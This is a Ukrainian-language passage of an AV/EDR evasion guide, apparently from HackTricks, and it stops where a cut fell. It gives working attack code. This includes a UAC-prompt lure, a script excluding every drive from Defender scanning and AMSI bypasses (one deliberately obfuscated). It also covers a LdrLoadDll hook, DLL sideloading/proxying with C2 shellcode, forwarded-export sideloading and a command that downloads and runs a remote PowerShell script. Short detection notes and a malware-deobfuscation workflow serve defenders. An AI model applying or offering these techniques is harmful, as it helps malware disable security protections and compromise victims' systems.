# Обхід AV

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинка Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки роботи Windows Defender, що імітує інший AV.
- [Вимкнення Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка UAC у стилі інсталятора перед втручанням у Defender

Публічні лоадери, замасковані під game cheats, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення привілеїв**, а вже потім нейтралізують Defender. Процес простий:

1. Перевірити наявність адміністративного контексту за допомогою `net session`. Команда виконується лише тоді, коли викликач має права адміністратора, тому помилка означає, що лоадер запущено від імені стандартного користувача.
2. Негайно повторно запустити себе за допомогою дієслова `RunAs`, щоб викликати очікуваний запит згоди UAC, зберігши початковий командний рядок.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють «cracked» програмне забезпечення, тому запит зазвичай приймається, надаючи malware права, необхідні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Загальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимізують сліпі зони Defender, а не повністю вимикають службу. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і знімний диск стає недоступним для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить кожну підключену файлову систему (D:\, E:\, USB-накопичувачі тощо), тому **будь-який майбутній payload, розміщений у будь-якому місці на диску, ігнорується**.
- Виключення розширення `.sys` є перспективним: зловмисники залишають за собою можливість пізніше завантажувати unsigned drivers, не взаємодіючи з Defender повторно.
- Усі зміни записуються в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу наступним етапам підтвердити збереження виключень або розширити їх без повторного запуску UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану продовжують повідомляти «антивірус активний», хоча перевірка в реальному часі ніколи не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Наразі AV використовують різні методи перевірки того, чи є файл шкідливим: static detection, dynamic analysis, а в більш advanced EDR — behavioural analysis.

### **Static detection**

Static detection реалізується шляхом виявлення відомих шкідливих рядків або масивів байтів у binary чи script, а також вилучення інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, digital signatures, іконки, checksum тощо). Це означає, що використання відомих публічних tools може швидше привернути увагу, оскільки їх, імовірно, вже проаналізували та позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Encryption**

Якщо зашифрувати binary, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати її та запустити програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити кілька рядків у binary або script, щоб він пройшов повз AV, але залежно від того, що саме ви намагаєтеся обфускувати, це може бути тривалим завданням.

- **Custom tooling**

Якщо ви розробляєте власні tools, відомих bad signatures не буде, але це потребує багато часу та зусиль.

> [!TIP]
> Хорошим способом перевірити static detection у Windows Defender є [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розділяє файл на кілька сегментів, а потім доручає Defender сканувати кожен із них окремо, завдяки чому можна точно визначити, які рядки або байти у вашому binary були позначені.

Наполегливо рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати та прочитати паролі браузера, виконанням minidump процесу LSASS тощо). Із цією частиною може бути дещо складніше працювати, але ось кілька способів ухилятися від sandbox.

- **Sleep before execution** Залежно від реалізації це може бути чудовим способом обійти dynamic analysis AV. AV має дуже мало часу на сканування файлів, щоб не переривати робочий процес користувача, тому тривалі sleep можуть завадити аналізу binary. Проблема в тому, що багато sandbox AV можуть просто пропустити sleep залежно від способу його реалізації.
- **Checking machine's resources** Зазвичай sandbox має дуже мало доступних ресурсів (наприклад, < 2GB RAM), інакше він може сповільнювати комп'ютер користувача. Тут також можна проявити креативність: наприклад, перевірити температуру CPU або навіть швидкість вентиляторів — у sandbox може бути реалізовано не все.
- **Machine-specific checks** Якщо ви хочете націлитися на користувача, робоча станція якого приєднана до домену "contoso.local", можна перевірити домен комп'ютера та з'ясувати, чи відповідає він указаному вами. Якщо ні, можна завершити роботу програми.

Виявляється, computername у Microsoft Defender's Sandbox — HAL9TH, тому перед detonation можна перевірити ім'я комп'ютера у вашому malware. Якщо ім'я збігається з HAL9TH, це означає, що ви перебуваєте всередині defender's sandbox, тож програму можна завершити.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька дуже хороших порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже зазначали раніше в цьому пості, **public tools** зрештою **будуть виявлені**, тому варто поставити собі запитання:

Наприклад, якщо ви хочете виконати dump LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися іншим проєктом, який менш відомий і також виконує dump LSASS?

Правильною відповіддю, імовірно, буде другий варіант. Якщо взяти mimikatz як приклад, це, напевно, один із найбільш, якщо не найбільш, позначених AV та EDR malware. Сам проєкт надзвичайно крутий, але працювати з ним для обходу AV — справжній кошмар, тож просто шукайте альтернативи для досягнення потрібної мети.

> [!TIP]
> Під час модифікації payloads для evasion обов'язково **вимкніть automatic sample submission** у Defender і, будь ласка, серйозно — **НЕ ЗАВАНТАЖУЙТЕ ЇХ НА VIRUSTOTAL**, якщо ваша довгострокова мета — досягнення evasion. Якщо ви хочете перевірити, чи виявляє ваш payload певний AV, установіть його на VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте перевагу DLL для evasion**. З мого досвіду, DLL-файли зазвичай **виявляються та аналізуються набагато рідше**, тому в деяких випадках це дуже простий спосіб уникнути виявлення (звісно, якщо ваш payload може працювати як DLL).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Тепер розглянемо кілька tricks, які можна використовувати з DLL-файлами, щоб зробити їх набагато stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи victim application і malicious payload(s) поруч один з одним.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та наведеного нижче powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, уразливих до DLL hijacking, усередині "C:\Program Files\\", а також DLL-файлів, які вони намагаються завантажити.

Я наполегливо рекомендую **самостійно досліджувати програми, придатні для DLL Hijacking/Sideloading**. За належного виконання ця техніка є досить прихованою, але якщо ви використовуєте загальновідомі програми, придатні для DLL Sideloading, вас можуть легко виявити.

Просте розміщення шкідливої DLL із назвою, яку очікує завантажити програма, не призведе до виконання вашого payload, оскільки програма очікує наявність певних функцій усередині цієї DLL. Щоб виправити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма здійснює, із proxy (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми та забезпечуючи можливість виконання вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL із новою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають показник Detection 0/26 на [antiscan.me](https://antiscan.me)! Я б назвав це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **настійно рекомендую** переглянути [twitch VOD S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про те, що ми обговорили, у більшій глибині.

### Abusing Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказівника на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли caller дозволяє export, Windows loader:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Дозволяє `TargetFunc` з нього

Ключові особливості, які потрібно розуміти:
- Якщо `TargetDll` є KnownDLL, він надається із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується стандартний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це створює примітив для непрямого sideloading: знайдіть підписану DLL, яка експортує функцію, перенаправлену до імені модуля, що не є KnownDLL, а потім розмістіть цю підписану DLL разом із DLL під контролем attacker, названою точно так само, як перенаправлений цільовий модуль. Коли викликається перенаправлений export, loader дозволяє forward і завантажує вашу DLL з тієї самої директорії, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, спостережений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому він знаходиться за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки, доступної для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної DllMain; реалізовувати перенаправлену функцію для запуску DllMain не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Запустіть перенаправлення за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв’язання `KeyIsoSetAuditingInterface` loader переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилку "missing API" буде отримано лише після того, як `DllMain` уже виконався

Поради для пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар forwarder для Windows 11, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL з несистемних шляхів, а потім завантажують не-KnownDLLs з такою самою базовою назвою з цього каталогу
- Створюйте сповіщення для ланцюжків процесів/модулів на кшталт: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте write+execute у каталогах застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це payload toolkit для обходу EDR за допомогою suspended processes, direct syscalls та alternative execution methods`

Ви можете використовувати Freeze для прихованого завантаження та виконання свого shellcode.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це лише гра в кішки-мишки: те, що працює сьогодні, завтра може бути виявлено, тому ніколи не покладайтеся лише на один інструмент і, якщо можливо, намагайтеся поєднувати кілька технік evasion.

## Прямі/непрямі Syscalls та визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **direct** або **indirect syscall stubs**, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додає інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до export `ntdll`).
- **Indirect**: переходить до наявного `syscall` gadget усередині `ntdll`, щоб перехід у kernel mode виглядав так, ніби він походить від `ntdll` (корисно для evasion евристик); **randomized indirect** обирає gadget із pool для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної opcode-послідовності `0F 05` на диску; визначає syscall sequence під час виконання.

**Стійкі до hooks стратегії визначення SSN:**
- **FreshyCalls (VA sort)**: визначає SSN, сортуючи syscall stubs за virtual address замість читання байтів stub.
- **SyscallsFromDisk**: відображає чистий `\KnownDlls\ntdll.dll`, зчитує SSN із його `.text`, а потім скасовує відображення (обходить усі hooks у пам’яті).
- **RecycledGate**: поєднує визначення SSN через VA sort із перевіркою opcode, коли stub чистий; якщо встановлено hook, використовує визначення через VA.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH для отримання SSN з `EAX` під час виконання, не аналізуючи bytes із hooks.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тому, якщо вдавалося виконати payload **безпосередньо в пам'яті**, AV не міг цьому запобігти, оскільки не мав достатньої видимості.

Функція AMSI інтегрована в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв під час встановлення EXE, COM, MSI або ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Вона дає антивірусним рішенням змогу перевіряти поведінку скриптів, надаючи вміст скриптів у незашифрованій і не обфускованій формі.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає на початку `amsi:`, а потім шлях до виконуваного файлу, з якого було запущено скрипт, у цьому випадку — powershell.exe.

Ми не записували жодного файлу на диск, але все одно були виявлені в пам'яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, C#-код також проходить через AMSI. Це навіть стосується `Assembly.Load(byte[])`, який використовується для завантаження виконання в пам'ять. Тому для виконання в пам'яті рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче), якщо ви хочете обійти AMSI.

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI здебільшого працює зі статичними виявленнями, модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатна деобфускувати скрипти, навіть якщо вони мають кілька рівнів обфускації, тому obfuscation може бути невдалим варіантом залежно від способу її виконання. Через це обхід не є настільки простим. Водночас іноді достатньо змінити лише кілька назв змінних — і все працюватиме, тому це залежить від того, наскільки щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), нею можна легко маніпулювати навіть із правами непривілейованого користувача. Через цей недолік реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Примусове завершення ініціалізації AMSI з помилкою (amsiInitFailed) призведе до того, що для поточного процесу сканування не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру для запобігання ширшому використанню цього методу.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усе, що знадобилося, — це один рядок коду PowerShell, щоб зробити AMSI непридатним для використання в поточному процесі PowerShell. Звісно, цей рядок сам AMSI позначив як шкідливий, тому для використання цієї техніки потрібна певна модифікація.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що цей матеріал, імовірно, буде позначено після публікації, тому не слід публікувати код, якщо ваш план полягає в тому, щоб залишатися непоміченим.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) та її перезаписі інструкціями, що повертають код E_INVALIDARG. У результаті фактичного сканування буде повернуто значення 0, яке інтерпретується як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Також існує багато інших технік для обходу AMSI у powershell. Перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) та [**цей repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, language-agnostic bypass полягає у встановленні user-mode hook на `ntdll!LdrLoadDll`, який повертає помилку, коли запитуваним модулем є `amsi.dll`. У результаті AMSI ніколи не завантажується, і для цього процесу не виконується жодне сканування.<sup>[[23]](#references)</sup>

Опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Нотатки
- Працює в PowerShell, WScript/CScript і custom loaders (у всіх випадках, коли інакше завантажувався б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Використовувалося в loaders, запущених через LOLBins (наприклад, `regsvr32`, що викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для bypass AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для bypass AMSI, який уникає сигнатур завдяки рандомізованим user-defined функціям, змінним і виразам із символів, а також застосовує випадковий регістр символів у ключових словах PowerShell для уникнення сигнатур.

**Видаліть виявлену сигнатуру**

Ви можете використовувати такі інструменти, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену AMSI-сигнатуру з пам'яті поточного процесу. Цей інструмент сканує пам'ять поточного процесу на наявність AMSI-сигнатури, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам'яті.

**Продукти AV/EDR, які використовують AMSI**

Список продуктів AV/EDR, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тому ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так:
```bash
powershell.exe -version 2
```
## Логування PS

Логування PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту та усунення несправностей, але також може бути **проблемою для attackers, які хочуть уникнути виявлення**.

Щоб обійти логування PowerShell, можна використовувати такі техніки:

- **Вимкнення Transcription і Module Logging PowerShell**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використання PowerShell version 2**: якщо використовувати PowerShell version 2, AMSI не буде завантажено, тому скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використання unmanaged PowerShell session**: використовуйте [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell без запуску `powershell.exe` (підхід, який використовує `powerpick` у Cobalt Strike). Це обходить засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging або всі інші засоби захисту PowerShell; охоплення залежить від runtime та реалізації host.


## Обфускація

> [!TIP]
> Кілька технік обфускації покладаються на шифрування даних, що збільшує ентропію binary і полегшує його виявлення засобами AV та EDR. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до окремих секцій коду, які є чутливими або потребують приховування.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Під час аналізу malware, який використовує ConfuserEx 2 (або commercial forks), часто доводиться мати справу з кількома рівнями захисту, які блокують decompilers і sandboxes. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який після цього можна decompile у C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення Anti-tampering — ConfuserEx шифрує кожне *method body* і розшифровує його всередині static constructor (`<Module>.cctor`) *module*. Це також змінює PE checksum, тому будь-яка модифікація призведе до аварійного завершення binary. Використовуйте **AntiTamperKiller**, щоб знайти зашифровані metadata tables, відновити XOR keys і перезаписати чисту assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними під час створення власного unpacker.

2.  Відновлення Symbol / control-flow — передайте *clean* file до **de4dot-cex** (fork de4dot із підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Прапорці:
• `-p crx` – вибрати profile для ConfuserEx 2
• de4dot скасує control-flow flattening, відновить original namespaces, classes і variable names та розшифрує constant strings.

3.  Видалення Proxy-call — ConfuserEx замінює прямі method calls легкими wrappers (так званими *proxy calls*), щоб ще більше ускладнити decompilation. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку замість непрозорих wrapper functions (`Class8.smethod_10`, …) ви маєте побачити звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`.

4.  Ручне очищення — запустіть отриманий binary у dnSpy, виконайте пошук великих Base64 blobs або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *real* payload. Часто malware зберігає його як TLV-encoded byte array, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює execution flow **без потреби запускати шкідливий sample** — це корисно під час роботи на offline workstation.

> 🛈  ConfuserEx створює custom attribute з назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного triage samples.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: обфускатор C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork компіляційного набору [LLVM](http://www.llvm.org/), здатного забезпечити підвищену безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від модифікацій.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без застосування зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає рівень обфускованих операцій, згенерованих за допомогою шаблонного метапрограмування C++, що дещо ускладнює життя тому, хто намагається зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, здатний обфускувати різні PE-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це framework дрібнозернистої обфускації коду для мов, що підтримуються LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly-коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний конвертувати наявні EXE/DLL у shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою LLVM compiler-assisted

Замість маскування всього implant лише під час сну, модифікований backend LLVM X86 може підтримувати вибрані функції XOR-маскованими щоразу, коли вони неактивні. PoC Function Peekaboo вибирає demangled names, що містять `REG_`, вставляє position-independent entry/exit stubs навколо фінального машинного коду та генерує один спільний masking handler у `.text`; сигнатури на рівні source code і calling convention Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Трансформація control flow у backend

